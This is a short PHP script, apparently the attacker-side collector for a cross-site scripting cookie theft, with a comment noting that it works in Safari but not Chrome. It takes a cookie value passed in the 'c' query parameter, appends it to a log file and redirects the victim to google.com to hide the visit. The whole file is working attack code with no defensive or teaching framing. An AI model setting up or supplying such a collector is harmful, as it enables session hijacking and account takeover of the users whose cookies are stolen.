// Works for Safari, not for Chrome

<?php
header ('Location:https://google.com');
	$cookies = $_GET['c'];
	$file = fopen('log.txt', 'a');
	fwrite($file, $cookies . PHP_EOL);
?>
